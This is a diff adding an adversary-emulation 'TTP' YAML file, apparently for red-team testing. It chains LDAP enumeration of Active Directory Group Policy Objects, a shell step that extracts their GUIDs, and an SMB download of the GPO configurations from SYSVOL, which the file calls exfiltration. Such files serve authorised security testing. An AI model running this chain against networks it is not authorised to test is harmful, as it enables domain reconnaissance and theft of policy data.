@@ -1,0 +1,70 @@
+---
+api_version: 2.0
+uuid: 7d735268-f290-4dbe-a84d-d8600fa5fb0e
+name: GPO Discovery and Configuration Exfiltration
+authors:
+  - isaac_fletcher
+description: |
+  This chain TTP performs end-to-end Group Policy discovery and configuration exfiltration.
+
+  The attack chain:
+  1. Discovery: Enumerates GPOs via LDAP using enumerate-gpos-via-ldap
+  2. Exfiltration: Downloads GPO configurations from SYSVOL via SMB
+requirements:
+  platforms:
+    - os: linux
+mitre:
+  tactics:
+    - TA0007 Discovery
+  techniques:
+    - T1615 Group Policy Discovery
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: The username in DOMAIN\\user format for LDAP/SMB authentication
+    default: CONTOSO\\admin
+  - name: password
+    description: The password for the user
+  - name: output_dir
+    description: Directory to save downloaded GPO configurations
+    default: /tmp/gpo_configs
+steps:
+  - name: enumerate_gpos
+    description: Enumerate GPOs via LDAP
+    ttp: //discovery/enumerate-gpos-via-ldap/ttp.yaml
+    args:
+      domain: "{{ .Args.domain }}"
+      dc: "{{ .Args.dc }}"
+      bind_user: '{{ .Args.username }}'
+      bind_password: "{{ .Args.password }}"
+      use_ldaps: true
+    outputvar: ldap_output
+
+  - name: extract_gpo_guids
+    description: Extract GPO GUIDs from the LDAP output
+    inline: |
+      LDAP_OUTPUT=$(cat <<'LDAPEOF'
+      {[{.StepVars.ldap_output}]}
+      LDAPEOF
+      )
+
+      GPO_GUIDS=$(echo "$LDAP_OUTPUT" | grep -oE '\{[A-Fa-f0-9-]+\}' | sort -u)
+
+      echo "$GPO_GUIDS" | tr '\n' ',' | sed 's/,$//'
+    outputvar: gpo_guids_csv
+
+  - name: exfiltrate_gpo_configs
+    description: Download GPO configurations from SYSVOL via SMB
+    ttp: //discovery/download-gpos-from-sysvol/ttp.yaml
+    args:
+      domain: "{{ .Args.domain }}"
+      dc: "{{ .Args.dc }}"
+      username: '{{ .Args.username }}'
+      password: "{{ .Args.password }}"
+      gpo_guids: "{[{ .StepVars.gpo_guids_csv }]}"
+      output_dir: "{{ .Args.output_dir }}"
